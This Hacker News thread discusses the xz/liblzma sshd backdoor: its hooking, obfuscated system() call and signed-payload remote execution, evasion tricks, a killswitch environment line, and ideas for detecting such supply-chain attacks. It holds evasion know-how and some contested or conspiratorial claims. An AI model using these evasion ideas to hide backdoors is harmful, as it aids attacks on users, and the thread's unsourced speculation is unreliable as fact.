reply amelius 17 minutes agoparentprevBackdoors can be placed in any type of software. For example, a GIMP plugin could connect to your display and read keystrokes, harvest passwords, etcetera. Utilities run by the superuser are of course even more potentially dangerous. Supply-chain attacks like these are just bound to happen. Perhaps not as often in SSH which is heavily scrutinized, but the consequences can be serious nevertheless. reply x-yl 15 minutes agoparentprevCan I ask for why it wouldn't have been discovered if the obvious delay wasn't present? Wouldn't anyone profiling a running sshd (which I have to imagine someone out there is doing) see it spending all its crypto time in liblzma? reply wepple 12 hours agoparentprevI expect a lot of people will be doing a whole lot of thinking along these lines over the next months. Code review? Some kind of behavioral analysis? IMO the call to system() was kind of sloppy, and a binary capabilities scanner could have potentially identified a path to that. reply tux3 12 hours agorootparentI think behavioral analysis could be promising. There's a lot of weird stuff this code does on startup that any reasonable Debian package on the average install should not be doing in a million years. Games and proprietary software will sometimes ship with DRM protection layers that do insane things in the name of obfuscation, making it hard to distinguish from malware. But (with only a couple exceptions) there's no reason for a binary or library in a Debian package to ever try to write the PLT outside of the normal mechanism, to try to overwrite symbols in other modules, to add LD audit hooks on startup, to try to resolve things manually by walking ELF structures, to do anti-debug tricks, or just to have any kind of obfuscation or packing that free software packaged for a distro is not supposed to have. Some of these may be (much) more difficult to detect than others, some might not be realistic. But there are several plausible different ways a scanner could have detected something weird going on in memory during ssh startup. No one wants a Linux antivirus. But I think everyone would benefit from throwing all the behavioral analysis we can come up with at new Debian package uploads. We're very lucky someone noticed this one, we may not have the same luck next time. reply raggi 11 hours agorootparentExcept had we been doing that they would have put guards in place to detect it - as they already had guards to avoid the code path when a debugger is attached, to avoid building the payload in when it's not one of the target systems, and so on. Their evasion was fairly extensive, so we'd need many novel dynamic systems to stand a chance, and we'd have to guard those systems extremely tightly - the author got patches into oss-fuzz as well to \"squash false positives\". All in all, adding more arms to the arms race does raise the bar, but the bar they surpassed already demonstrated tenacity, long term thinking, and significant defense and detection evasion efforts. reply tux3 11 hours agorootparentI broadly agree, but I think we can draw a parallel with the arms race of new exploit techniques versus exploit protection. People still manage to write exploits today, but now you must find an ASLR leak, you must chain enough primitives to work around multiple layers of protection, it's generally a huge pain to write exploits compared to the 90s. Today the dynamic detection that we have for Linux packages seems thin to non-existent, like the arms race has not even started yet. I think there is a bit of low-hanging fruit to make attacker lives harder (and some much higher-hanging fruit that would be a real headache). Luckily there is an asymmetry in favor of the defenders (for once). If we create a scanner, we do not _have_ to publish every type of scan it knows how to do. Much like companies fighting spammers and fraud don't detail exactly how they catch bad actors. (Or, for another example, I know the Tor project has a similar asymmetry to detect bad relays. They collaborate on their relay scanner internally, but no one externally knows all the details.) reply saagarjha 5 hours agorootparentThis is an arms race that is largely won by attackers, actually. Sophisticated attacks are caught by them sometimes but usually the author has far more knowledge or cleverer tricks than the person implementing the checks, who is limited by their imagination of what they think an attacker might do. reply raggi 11 hours agorootparentprevYeah, perhaps something akin to an OSS variant of virustotal's multi-vendor analysis. I'm still not sure it would catch this, but as you say, raising the bar isn't something we tend to regret. reply robocat 10 hours agorootparentprev> we may not have the same luck next time If the prior is 1 was out there (this one), the chances that there is 1+ still undetected seems fairly high to me. To behaviourally detect this requires many independent actors to be looking in independent ways(e.g. security researchers, internal teams). Edit: I mean with private code & tests (not open source, nor purchasable antivirus). It's not easy to donate to Google Zero. Some of the best funded and most skilled teams seem to be antivirus vendors (and high value person protection). I hate the antivirus industry yet I've been helped by it (the anti-tragedy of the commons). Commonly public detection code (e.g. open source) is likely to be defeated by attackers with a lot of resources. Hard to protect ourselves against countries where the individuals are safe from prosecution. Even nefarious means like assasination likely only work against individuals and not teams. reply bandrami 4 hours agorootparent> If the prior is 1 That would surprise me greatly reply lazyasciiart 1 hour agorootparentI think you’re saying “I would be surprised if there is only 1 exploit like this that already exists” which is what the previous comment was also saying. “If the prior is one” is often used to mean “we know for sure that there is one”. reply snnn 11 hours agorootparentprev> to try to overwrite symbols in other modules, to add LD audit hooks on startup, to try to resolve things manually by walking ELF structures I want to name one thing: when Windows failed to load a DLL because a dependency was missing, it doesn't tell you what was missed. To get the information, you have to interact with the DLL loader with low level Windows APIs. In some circumstances Linux apps may also have the need. Like for printing a user friendly error message or recovery from a non-fatal error. For example, the patchelf tool that is used for building portable python packages. > No one wants a Linux antivirus It is not true. Actually these software are very popular in enterprise settings. reply cryptonector 9 hours agorootparentprev> But I think everyone would benefit from throwing all the behavioral analysis we can come up with at new Debian package uploads. Why \"new uploads\" and not also \"all existing\"? reply ffsm8 11 hours agorootparentprev> No one wants a Linux antivirus ClamAV has been around for a very long time at this point. It's just not installed on servers, usually reply snnn 9 hours agorootparentDoes not have to be installed. See this: https://learn.microsoft.com/en-us/azure/defender-for-cloud/c... A cloud provider can take snapshots of running VMs then run antivirus scan offline to minimize the impact to the customers. Similarly, many applications are containerized and the containers are stateless, we can scan the docker images instead. This approach has been quite mature. reply nwallin 9 hours agorootparentprevIn general, my gut feeling is that I expect the majority ClamAV installations to be configured to scan for Windows viruses in user submitted content. Email, hosting sites, etc. reply kemotep 11 hours agorootparentprevTo say nothing of enterprise EDR/XDR solutions that have linux versions. These things aren’t bulletproof but can be 1 layer in your multilayer security posture. reply EasyMark 10 hours agorootparentprevdon't most people who use that just use it for scanning incoming email attachments usually? reply snnn 9 hours agorootparentClamAV also has a lot of findings when scanning some open source project's source code. For example, LLVM project's test data. Because some of the test data are meant to check if a known security bug is fixed, from a antivirus software perspective these data files can be seen as exploits. ClamAV is commonly used. Or, I would suggest adding it to every CI build pipeline. Most time it wouldn't have any finding, but it is better than nothing. I would like to offer free help if an open source project has the need to harden their build pipelines and their release process. reply cipherzero 5 hours agorootparentprevSorry, I'm unfamiliar with PLT what does stand for? reply intelVISA 4 hours agorootparentprocedure linkage table reply ashishbijlani 7 hours agorootparentprevI’ve been building Packj [1] to detect malicious PyPI/NPM/Ruby/PHP/etc. dependencies using behavioral analysis. It uses static+dynamic code analysis to scan for indicators of compromise (e.g., spawning of shell, use of SSH keys, network communication, use of decode+eval, etc). It also checks for several metadata attributes to detect bad actors (e.g., typo squatting). 1. https://github.com/ossillate-inc/packj reply londons_explore 10 hours agorootparentprevI'm really surprised they did a call to system() rather than just implement a tiny bytecode interpreter. A bytecode interpreter that can call syscalls can be just a few hundred bytes of code, and means you can avoid calling system() (whose calls might be logged), and avoid calling mprotect to make code executable (also something likely to raise security red flags). The only downside of a bytecode interpreter is the whole of the rest of your malware needs to be compiled to your custom bytecode to get the benefits, and you will take a pretty big performance hit. Unless you're streaming the users webcam, that probably isn't an issue tho. reply jnwatson 11 hours agorootparentprevThe real problem was doing expensive math for every connection. If it had relied on a cookie or some simpler-to-compute pre-filter, no one would have been the wiser. reply anarazel 10 hours agorootparentThe slowdown is actually in the startup of the backdoor, not when it's actually performing authentication. Note how in the original report even sshd -h (called in the right environment to circumvent countermeasures) is slow. reply klabb3 5 hours agorootparentWow. Given the otherwise extreme sophistication this is such a blunder. I imagine the adversary is tearing their hair out over this. 2-3 years of full time infiltration work down the drain, for probably more than a single person. As for the rest of us, we got lucky. In fact, it’s quite hilarious that some grump who’s thanklessly perf testing other people’s code is like “no like, exploit makes my system slower”. reply mitjam 2 hours agorootparentIf it was not fulltime work I wonder what else they have been working on with different accounts. reply raggi 11 hours agorootparentprevthe call to system is obfuscated, static analysis wouldn't see it reply XorNot 10 hours agorootparentprevIf you think about it this is a data-providence problem though. The exploit was hidden in \"test\" code which gets included in release code by compiler flags. Now, if there was a proper chain of accountability for data, then this wouldn't have been possible to hide the way it is - any amount of pre-processing resulting in the release tarball including derived products of \"test\" files would be suspicious. The problem is we don't actually track data providence like this - no build system does. The most we do is-> . But we don't include the human readable data which explains how that transform happens at enough levels. reply someguydave 8 hours agorootparentprevDynamic linking was a mistake and should be eliminated reply kbenson 3 hours agorootparentThat this was dynamically linked is the least interesting thing about it IMO. It was a long term I filtration where they got legitimate commit access to a well used library. If xz was statically linked in some way, or just used as an executa Le to compress something (like the kernel), the same problems exist and no dynamic linking would need to be involved. reply radiospiel 26 minutes agorootparent> If xz was statically linked in some way, or just used as an executa Le to compress something (like the kernel), the same problems exist and no dynamic linking would need to be involved. even more so: all binaries dynamically linking xz can be updated by installing a fixed library version. For statically linked binaries: not so much, each individual binary would have to be relinked, good luck with that. reply Cloudef 2 hours agorootparentprevNot true, it would be much harder to hook into openssl functions if the final executable was static [1], the only way is that if the openssl function this attack targeted, actually called a function from libxz. [1] https://sourceware.org/glibc/wiki/GNU_IFUNC Dynamic loading is relic of the past and cause of many headaches in linux ecosystem, in this case it also just obfuscates the execution path of the code more so you can't really rely on the code you are reading. Unfortunately I don't think it's possible to completely get rid of dynamic loading as some components such as GPU drivers require it, but it should be reduced to minimum. reply FeepingCreature 2 hours agorootparentLooking at IFUNC, there never seems to be a reason to allow function loading from a different library than the one the call is in, right? Maybe a restriction like that could be built in. Or just explicitly enumerate the possible substitutions per site. reply intelVISA 4 hours agorootparentprevyep, but how to reverse such a blunder? reply x0x0 11 hours agorootparentprevnext [11 more] [flagged] raggi 11 hours agorootparentThink whatever you shall about systemd of course, but please stop with the blind belief mud slinging: - systemd didn't create the patch to include libsystemd, distros did - current systemd versions already remove liblzma from their dependencies, the affected distros are behind on systemd updates though - you can implement notify in standalone code in about the same effort as it takes to use the dependency, there wasn't really a good reason for distro's to be adding this dependency to such a critical binary. systemd documents the protocol independently to make this easy. distros having sketchy patches to sshd has a long history, remember the debian weak key fiasco? reply Denvercoder9 11 hours agorootparent> - current systemd versions already remove liblzma from their dependencies, the affected distros are behind on systemd updates though The affected distros aren't behind on systemd updates, the change to systemd you describe has been merged but not yet released. reply raggi 11 hours agorootparentAh, thank you for the correction! reply everybackdoor 10 hours agorootparentprevThis message and others like it feel like a concerted effort at damage control around systemd. Essentially, the optics here are that an intelligence agency created systemd to be used as a secret garden, and then manufactured community support for it using social engineering (”you’re too stupid/old/bitter to understand the complex marvel we’ve created”) and now we’re all living in la-la land when it comes to computer security. reply rcxdude 9 hours agorootparentThis is full conspiracy mode thinking. reply webmaven 3 hours agorootparentYes, well, there actually was a conspiracy here, wasn't there? The only question is how extensive it was in time and space. reply kimixa 1 hour agorootparentI wonder if the fact they \"had\" to use a dependency and jump through a number of hoops suggest they're not involved in the conspiracy? As if they had this sort of access and effort surely systemd itself would be an easier target? But that's not saying this is the only conspiracy, maybe there's hundreds of other similar things in published code right now, and one was noticed soon after introduction merely due to luck. reply pas 11 hours agorootparentprevlibselinux also links to liblzma (and gets into sshd via PAM) https://news.ycombinator.com/item?id=39867126 reply cqqxo4zV46cp 10 hours agorootparentprevNo. You are still bitter about systemd and are trying to assert blame which does not reasonably exist. reply inferiorhuman 10 hours agorootparentI'm not bitter, I'm wary of systemd in a security context. Their vulns seem to be a result of poor choices made deliberately rather than mistakes or sloppy coding (e.g. defaulting to running units as root when the UID/username couldn't be parsed). Lennart was staunchly anti-CVE, which to me seems again like making a deliberate choice that will only hinder a secure implementation. I haven't followed systemd too closely, has their stance on CVEs at least evolved? https://soylentnews.org/article.pl?sid=17/07/30/0251232 reply nurple 9 hours agoparentprevI think one interesting corollary here is how the Ken Thompson attack was discovered at PWB[0] because it had a memory performance bug[1]. [0] https://en.wikipedia.org/wiki/PWB/UNIX [1] https://news.ycombinator.com/item?id=38020792 reply joeyh 12 hours agoparentprevSince a liblzma backdoor could be used to modify compiler packages that are installed on some distributions, it gets right back to a trusting trust attack. Although initial detection via eg strace would be possible, if the backdoor was later removed or went quiescentit would be full trusting trust territory. reply ghostpepper 11 hours agorootparentHow would this be possible? This backdoor works because lzma is loaded into sshd (by a roundabout method involving systemd). I don't think gcc or clang links lzma. reply joeyh 10 hours agorootparentdpkg-deb is linked with liblzma reply dist-epoch 10 hours agorootparentprevWhen the backdoor is loaded by sshd it could modify the gcc/clang install, or some system header file. reply slim 10 hours agorootparentprevservers hosting gcc binaries are accessed using ssh reply geggo98 2 hours agoparentprevUsing a jump host could help, only allowing port forwarding. Ideally it would be heavily monitored and create a new instance for every connection (e.g., inside a container). The attacker would then be stuck inside the jump host and would have to probe where to connect next. This hopefully would then trigger an alert, causing some suspicion. A shared instance would allow the attacker to just wait for another connection and then follow its traces, without risking triggering an alert by probing. The ideal jump host would allow to freeze the running ssh process on an alert, either with a snapshot (VM based) or checkpointing (container based), so it can be analyzed later. reply rdtsc 12 hours agoparentprevAt least for some comic relief I'd like to imagine Jia's boss slapping him and saying something like \"you idiot, we worked on this for so many years and you couldn't have checked for any perf issues?\" But seriously, we could have found ourselves with this in all stable repos: RHEL, Debian, Ubuntu, IoT devices 5 years from now and it would have been a much larger shit show. reply josephg 5 hours agorootparentThis was the backdoor we found. We found the backdoor with performance issues. Whats more likely - that this is the only backdoor like this in linux, or that there are more out there and this is the one we happened to find? I really hope someone is out there testing for all of this stuff in linux: - Look for system() calls in compiled binaries and check all of them - Look for uses of IFUNC - specifically when a library uses IFUNC to replace other functions in the resulting executable - Make a list of all the binaries / libraries which don't landlock. Grep the sourcecode of all those projects and make sure none of them expect to be using landlock. reply saagarjha 4 hours agorootparentAll of this was obfuscated. None of this will be detectable with current static analysis techniques. reply josephg 2 hours agorootparentIFUNC and landlock could be debugged pretty easily at runtime, just by adding some instrumentation. reply djao 11 hours agorootparentprevMaybe they didn't have time to test? They could have been scrambling to make it into timed releases such as Ubuntu 24.04 or Fedora 40. reply raggi 11 hours agorootparentThere is one possible time pressure involved, which is that libsystemd dropped the liblzma dependency reply XorNot 10 hours agorootparentAbsolutely no intelligence agency would look at a successful compromise where they have a highly positioned agent in an organization like this, and burn them trying to rush an under-developed exploit in that would then become not useful almost immediately (because the liblzma dependency would be dropped next distro upgrade cycle). If you had a human-asset with decision making authority and trust in place, then as funded organization with regular working hours, you'd simply can the project and start prototyping new potential uses. reply nequo 8 hours agorootparentMight a time-sensitive high-priority goal override such reasoning? For example, the US presidential election is coming up. Making it into Ubuntu LTS could be worth the risk if valuable government targets are running that. reply kijin 3 hours agorootparentJia Tan tried to get his backdoored XZ into Ubuntu 24.04 just before the freeze, so that makes sense. Now is about the right time to get it into Fedora if he wants to backdoor RHEL 10, too. But I don't think valuable government targets are in any hurry to upgrade. I wouldn't expect widespread adoption of 24.04, even in the private sector, until well after the U.S. election. By the next election, though, everyone will be running it. Edit: According to another comment [1], there would only have been a short window of vulnerability during which this attack would have worked, due to changes in systemd. This might have increased pressure on the attacker to act quickly. [1] https://news.ycombinator.com/item?id=39881465 reply lobocinza 7 hours agorootparentprevPresumably this intelligence agency have multiple such initiatives and can afford to burn one to achieve a goal. reply refulgentis 9 hours agorootparentprevNo true Scotsman reply cjbprime 5 hours agorootparentprevOn the other hand, this was a two year long con.. reply vbezhenar 11 hours agorootparentprev> But seriously, we could have found ourselves with this in all stable repos: RHEL, Debian, Ubuntu, IoT devices 5 years from now and it would have been a much larger shit show. Think about backdoors that are already present and will never be found out. reply chris_wot 12 hours agorootparentprevSurely this is something the FBI should be involved with? Or some authority? reply t0mas88 2 hours agorootparentProbably the FBI for the public part of it, but if this wasn't a US owned operation you can be sure the CIA/NSA/military will do their own investigation. reply colinsane 12 hours agorootparentprevsure. what makes you think they aren't? reply sitkack 10 hours agorootparentWhy would the FBI investigate the NSA? We have zero idea who the actors involved are. reply pxc 4 hours agorootparentIt's not actually unusual for three-letter US agencies to be at odds with one another. But one possible reason is if the FBI is convinced that something the NSA is doing is illegal. They may not always be inclined to tolerate that. reply denton-scratch 17 minutes agorootparent> It's not actually unusual for three-letter US agencies to be at odds with one another. I'd noticed that; this seems to have been the case for a long time. You'd think that having state security agencies at war with one-another would be a disaster, but perhaps it's a feature: a sort of social \"layered security\". At any rate, it seems much better than having a bunch of state security agencies that all sing from the same songsheet. reply sitkack 1 hour agorootparentprevYou would have to agree that it was possible for the government to break the law. And what the repercussions are when that happens. reply colinsane 9 hours agorootparentprevmy comment allows for the NSA to be involved in this and for the FBI to not be investigating them. reply formerly_proven 11 hours agoparentprevI think this would’ve been difficult to catch because the patching of sshd happens during linking, when it’s permissible, and if this is correct then it’s not a master key backdoor, so there is no regular login audit trail. And sshd would of course be allowed to start other processes. A very tight SELinux policy could catch sshd executing something that ain’t a shell but hardening to that degree would be extremely rare I assume. As for being discovered outside the target, well we tried that exercise already, didn’t we? A bunch of people stared at the payload with valgrind et al and didn’t see it. It’s also fairly well protected from being discovered in debugging environments, because the overt infrastructure underlying the payload is incompatible with ASan and friends. And even if it is linked in, the code runs long before main(), so even if you were prodding around near or in liblzma with a debugger you wouldn’t normally observe it execute. e: sibling suggests strace, yes you can see all syscalls after the process is spawned and you can watch the linker work. But from what I’ve gathered the payload isn’t making any syscalls at that stage to determine whether to activate, it’s just looking at argv and environ etc. reply Deathcrow 4 hours agorootparent>A very tight SELinux policy could catch sshd executing something that ain’t a shell but hardening to that degree would be extremely rare I assume. Huh, ssh executes things that aren't shells all the time during normal operation. No? i.e. 'ssh myserver.lan cat /etc/fstab' reply tux3 11 hours agorootparentprevOne idea may be to create a patched version of ld-linux itself with added sanity checks while the process loads. For something much more heavy-handed, force the pages in sensitive sections to fault, either in the kernel or in a hypervisor. Then look at where the access is coming from in the page fault handler. I don't think you can reliably differentiate a backdoor executing a command, and a legitimate user logged in with ssh running a command once the backdoor is already installed. But the way backdoors install themselves is where they really break the rules. reply sgammon 6 hours agoprevThere appears to be a string encoded in the binary payload: https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01... Which functions as a killswitch: https://piaille.fr/@zeno/112185928685603910 If that is indeed the case, one mitigation might be ``` echo \"yolAbejyiejuvnup=Evjtgvsh5okmkAvj\"sudo tee -a /etc/environment ``` reply sgammon 5 hours agoparentMake absolutely sure to include `-a` so it doesn't nuke your env file, and generally speaking, one should upgrade to a version without the malicious code and restart, of course. reply dannyw 2 hours agoparentprevThat's so strange. This reeks of nation state actors, wanting ways to protect their own systems. reply ddalex 14 minutes agorootparentany competent malware dev would have a panic switch... reply chatmasta 12 hours agoprevCan someone explain succinctly what the backdoor does? Do we even know yet? The backdoor itself is not a payload, right? Does it need a malicious archive to exploit it? Or does it hook into the sshd process to listen for malicious packets from a remote attacker? The OP makes it sound like an attacker can send a malicious payload in the pre-auth phase of an SSH session - but why does he say that an exploit might never be available? Surely if we can reverse the code we can write a PoC? Basically, how does an attacker control a machine with this backdoor on it? reply swid 12 hours agoparentYou can imagine a door that opens if you knock on it just right. For anyone without the secret knock, it appears and functions as a wall. Without the secret knock, there might not even be a way to prove it opens at all. This is sort of the situation here. xz tries to decode some data before it does anything shady; since it is asymmetric; it can do the decryption without providing the secret encryption key (it has the public counterpart). The exploit code may never be available, because it is not practical to find the secret key, and it doesn't do anything obviously different if the payload doesn't decrypt successfully. The only way to produce the exploit code would be if the secret key is found somehow; and the only real way for that to happen would be for the people who developed the backdoor to leak it. reply tialaramex 9 hours agorootparentPrivate key. In cryptography we distinguish keys which are symmetric (needed by both parties and unavailable to everyone else) as \"Secret\" keys, with the pair of keys used in public key cryptography identified as the Private key (typically known only to one person/ system/ whatever) and Public key (known to anybody who cares) Thus, in most of today's systems today your password is a secret. You know your password and so does the system authenticating you. In contrast the crucial key for a web site's HTTPS is private. Visitors don't know this key, the people issuing the certificate don't know it, only the site itself has the key. I remember this by the lyrics to \"The Fly\" by the band U2, \"They say a secret is something you tell one other person. So I'm telling you, child\". reply forty 3 hours agorootparentI have often seen the secret component of an asymmetric key pair referred as secret key as well. See libsodium for example. Maybe it's because curve/ed 25519 secrets are 32 random bytes unlike RSA keys which have specific structure which makes them distinct from generic secrets. reply tux3 1 hour agorootparentIt also allows \"pk\" and \"sk\" as overly short variable names, an argument developpers are sometimes tempted by! reply kortilla 2 hours agorootparentprevPrivate keys are also “secrets” here in the security world. “Vault secures, stores, and tightly controls access to tokens, passwords, certificates, API keys, and other secrets in modern computing” Your distinction is not shared by the industry so it’s not something helpful to correct people on. reply SV_BubbleTime 8 hours agorootparentprev> You know your password and so does the system authenticating you. Nitpick, but no it shouldn’t. The HASH of your password is recorded. You never submit your password, you submit that hash and they compare it. The difference is that there is no two passwords that collide; but there are hashes that may. And that two equal passwords from two equal users are not necessarily accessible to someone with the hash list because they are modified at rest with salts. reply kevincox 7 hours agorootparentTo really nitpick the server does have the password during authentication. The alternate would be a PAKE which is currently quite rare. (But probably should become the standard) reply mr_mitm 2 hours agorootparentprev> You never submit your password, you submit that hash and they compare it. That's not true. If that were the case, the hash is now the password and the server stores it in clear text. It defeats the entire purpose of hashing passwords. Side note: that is (almost) how NTLM authentication works and why pass-the-hash is a thing in Windows networks. reply AnonHP 4 hours agorootparentprev> Nitpick, but no it shouldn’t. The HASH of your password is recorded. You never submit your password, you submit that hash and they compare it. Nitpick, but the password is submitted as-is by most client applications, and the server hashes the submitted password and compares it with the hash it has (of course, with salting). reply armada651 2 hours agorootparent> Nitpick, but the password is submitted as-is by most client applications, and the server hashes the submitted password and compares it with the hash it has (of course, with salting). I never understood why clients are coded this way. It's trivially easy to send the salt to the client and have it do the hashing. Though I guess it doesn't really improve security in a lot of cases, because if you successfully MITM a web app you can just serve a compromised client. reply mr_mitm 2 hours agorootparent> I never understood why clients are coded this way. Because it makes things less secure. If it was sufficient to send the hash to the server to authenticate, and the server simply compares the hash sent by the user with the hash in its database, then the hash as actually the password. An attacker doesn't need to know the password anymore, as the hash is sufficient. Hashing was introduced precisely because some vulnerabilities allow read access to the database. With hashed passwords, the attacker in such a situation has to perform a password guessing attack first to proceed. If it was sufficient to send the hash for authentication, the attacker would not need to guess anything. reply jamwil 6 hours agorootparentprevMore an implementation detail than a conceptual distinction, though. reply takeda 8 hours agorootparentprevI could be wrong, buy my understanding is that it isn't even a door. It simply allows anyone that has a certain private key, to send a payload that the server will execute. This won't produce any audit of someone logging in, you won't see any session etc. Any Linux with this installed would basically become a bot that can be taken over. Perhaps they could send a payload to make it DDoS another host, or payload to open a shell or payload that would install another backdoor with more functionality, and to draw attention away from this one. reply cjbprime 5 hours agorootparentprevIt looks like the exploit path calls system() on attacker supplied input, if the check passes. I don't think we need to go into more detail than \"it does whatever the attacker wants to on your computer, as root\". reply Nathanba 7 hours agorootparentprevI understand that we may never see the secret knock but shouldn't we have the door and what's behind it now? Doesn't this mean that the code is quite literally too hard to figure out for a human being? It's not like he can send a full new executable binary that he simply executes, then we'd see that the door is e.g the exec() call. Honestly this attempt makes me think that the entire c/c++ language stack and ecosystem is the problem. All these software shenanigans should not be needed in a piece of software like openssh but it's possible because it's written in c/c++. reply usrusr 14 minutes agorootparentThe \"stuff behind the door\" is conveniently uploaded with the secret knock. It's not there and it will never be because it's remotely executed without getting written down. The attacker does send executable code, singed and encrypted (or only one of them? It does not matter) with their private key. The door checks anything incoming for a match with the public key it has and executes when happy. C++ has nothing to do with this, it's the dynamic linking mechanism that allows trusted code the things it allows trusted code to do (talking about the hooking that makes the key check possible, not about the execution that comes after - that is even more mundane, code can execute code, it's a von Neumann architecture after all). reply db48x 5 hours agorootparentprevAll analogies are flawed, and we are rapidly approaching the point of madness. Still, let me try. In this case, someone on the inside of the building looked in a dusty closet and saw a strange pair of hinges on the wall of the closet. Turns out that the wall of the closet is an exterior wall adjoining the alley back behind the building! At least they know which contractor built this part of the building. Further examination revealed the locking mechanism that keeps the secret door closed until the correct knock is used. But because the lock is based on the deep mathematics of prime numbers, no mere examination of the lock will reveal the pattern of locks that will open it. The best you could do is sit there and try every possible knocking pattern until the door opens, and that would take the rest of your life, plus the rest of the lifetime of the Earth itself as well. Incidentally, I could write the same exploit in rust or any other safe language; no language can protect against a malicious programmer. As for detecting use of the back door, that's not entirely out of the question. However it sounds like it would not be as easy as logging every program that sshd calls exec on. But the audit subsystem should notice and record the activity for later use in your post–mortem investigation. reply Cloudef 3 hours agorootparentprevNothing here is something that could not be done in other languages. For example in Rust auditing this kind of supply chain attack is even more nightmarish if the project uses crates, as crates often are very small causing the \"npm effect\". Another good example is docker images. The way people often build docker images is not that they are build all the way from the bottom. The bottom layer(s) is/are often some arbitrary image from arbitrary source which causes a huge supply chain attack risk. reply djao 5 hours agorootparentprevThe payload is simply remote code execution. But we'll never know the secret knock that triggers it, and we can't probe existing servers for the flaw because we don't konw the secret knock. I imagine that we could in short order build ourselves a modified version of the malware, which contains a different secret knock, one that we know in advance, and then test what would have happened with the malware when the secret knock was given. But this still doesn't help us probe existing servers for the flaw, because those servers aren't running our modified version of the malware, they're running the original malware. reply mrln 57 minutes agorootparentprevIt's not too hard to figure out. People are figuring it out. If anything is too hard, it's due to obfuscation - not C/C++ shenanigans. As far as I understand from scrolling through these comments, an attacker can send a command that is used with the system() libc call. So the attacker basically has a root shell. reply ivlad 5 hours agorootparentprevThis is literally what the top post link is about. The backdoor functionality has been (roughly) figured out: after decryption and signature verification it passes the payload received in the signing key of the clients authentication certificate to system(). C/C++ is not a problem here because sshd has to run things to open sessions for users. reply creato 5 hours agorootparentprev> Honestly this attempt makes me think that the entire c/c++ language stack and ecosystem is the problem. All these software shenanigans should not be needed in a piece of software like openssh but it's possible because it's written in c/c++. Nothing about this relies on a memory safety exploit. It's hard to figure out because it's a prebuilt binary and it's clever. Unless you meant \"all compiled languages\" and not C/C++ specifically, it's irrelevant. The right thing to argue against based on your instinct (no one can figure out what is going on) is: it should be unacceptable for there to be prebuilt binaries committed to the source code. reply plg94 11 hours agoparentprevI don't think we know what exactly this does, yet. I can only answer one of those questions, as far as I understand the \"unreplayable\" part is refering to this: > Apparently the backdoor reverts back to regular operation if the payload is malformed or *the signature from the attacker's key doesn't verify*. emphasis mine, note the \"signature of the attacker's key\". So unless that key is leaked, or someone breaks the RSA algorithm (in which case we have far bigger problems), it's impossible for someone else (researcher or third-party) to exploit this backdoor. reply cryptonector 9 hours agorootparentIt's not using RSA. It's hooking RSA. And the attacker's signature is Ed448, not RSA. reply rmi_ 10 hours agorootparentprev> So unless that key is leaked But, just for replayability, we could \"patch\" the exploit with a known key and see what it does, don't we? reply usrusr 4 minutes agorootparentWhat could be done, I think, is patch the exploit into logging the payload (and perhaps some network state?) instead of executing it to be able to analyse it. Analyse it, in the unlikely case that the owner of the key would still try their luck using it after discovery, on a patched system. What it does: it's full RCE, remote code execution, it does whatever the attacker decides to upload. No mystery there. reply swid 10 hours agorootparentprevReplayability means something different in this context. First, we do know the backdoor will pass the payload to system, so in general it is like an attacker has access to bash, presumably as root since it is sshd. Replayability means, if someone were to catch a payload in action which did use the exploit, you can’t resend the attacker’s data and have it work. It might contain something like a date or other data specific only to the context it came from. This makes a recorded attack less helpful for developing a test… since you can’t replay it. reply tialaramex 8 hours agorootparent> It might contain something like a date or other data specific only to the context it came from. In all these modern protocols, including SSHv2 / SecSH (Sean Connery fans at the IETF evidently) both parties deliberately introduce random elements into a signed conversation as a liveness check - precisely to prevent replaying previous communications. TLS 1.3's zero round-trip (ORT) mode cannot do this, which is why it basically says you'd better be damn sure you've figured out exactly why it's safe to use this, including every weird replay scenario and why it's technically sound in your design or else you must not enable it. We may yet regret the whole thing and just tell everybody to refuse it. reply BlueFalconHD 10 hours agorootparentprevIt would be really cool if in 20 years when we have quantum computers powerful enough we could see what this exploit does. reply denysvitali 10 hours agorootparentMy understanding is that we know somehow already what the exploit allows the attacker to do - we just can't reproduce it because we don't have their private key. Technically, we can modify the backdoor and embed our own public key - but there is no way to probe a random server on the internet and check if it's vulnerable (from a scanner perspective). In a certain way it's a good thing - only the creator of the backdoor can access your vulnerable system... reply tialaramex 8 hours agorootparentIt's a NOBUS (Nobody But Us can use it) attack. The choice to use a private key means it's possible that even the person who submitted the tampered code doesn't have the private key, only some other entity controlling them does. reply kortilla 2 hours agorootparentprevWe do know what it does. If it decrypts it just passes to system(). reply superb_dev 10 hours agorootparentprevThis feels very targeted reply Ekaros 10 hours agorootparentOr very untargeted. Something intended just to lay dormant by chance if succeeded... It is very good backdoor to have if you at whatever time have dozens of options. See sshd running, test this you are done if it works, if not move to something else. reply dools 10 hours agorootparentOr targeted not really at doing anything but at researching the nature of supply chain vulnerabilities themselves. reply takeda 7 hours agorootparentThis doesn't look like a research. This looks like state sponsored attack. Imagine having a backdoor that you can just go to any Linux server and with your key you can make it execute any code you wish without any audit trail. And no one without the key can do it, so even if your citizens use such vulnerable system other states won't be able to use your backdoor. reply cjbprime 5 hours agorootparentprevSpending two years actually maintaining an open source project that you will later backdoor is a very expensive way to perform such research. reply cryptonector 9 hours agorootparentprevI don't understand yet where the \"unreplayable\" part comes from, but this isn't it. reply snnn 12 hours agoparentprevThat's the most interesting part. No, we don't know it yet. The backdoor is so sophisticated that none of us can fully understand it. It is not a “usual” security bug. reply mrln 48 minutes agorootparentWhat makes you say that? I haven't started reverse engineerinng it myself, but from all I have read, people who did have a very good understanding of what it does. They just can't use it themselves, because they would need to have the attacker's private key. reply heresWaldo 11 hours agorootparentprevYeah these types of security issues will be used by politicians to force hardware makers to lockdown hardware, embed software in chips. The go fast startups habit of “import the world to make my company products” is a huge security issue IT workers ignore. The only solution politics and big tech will chase is obsolete said job market by pulling more of the stack into locked down hardware, with updates only allowed to come from the gadget vendor. reply georgyo 11 hours agorootparentI'm not saying political forces won't try legislating the problem away, but that won't even help here. A supply chain attack can happen in hardware or software. Hardware has firmware, which is software. What makes this XZ attack so scary is that it was directly from a \"trusted\" source. A similar attack could come from any trusted source. At least with software it is much easier to patch. reply heresWaldo 6 hours agorootparentLike you said it has firmware which is flashable. Secure enclaves are never 100% secure but if only, for example, Apple can upload to them, it dramatically reduces some random open source project being git pulled. Apple may still pull open source but they would be on the hook to avoid this. Open sources days of declaring “use at your risk” have become a liability in this hyper networked society. It’s now becoming part of the problem it was imagined up to solve. reply avidiax 11 hours agorootparentprevThe NSA demands that Intel and AMD provide backdoor ways to turn off the IME/PSP, which are basically a small OS running in a small processor inside your processor. So the precedent is that the government wants less embedded software in their hardware, at least for 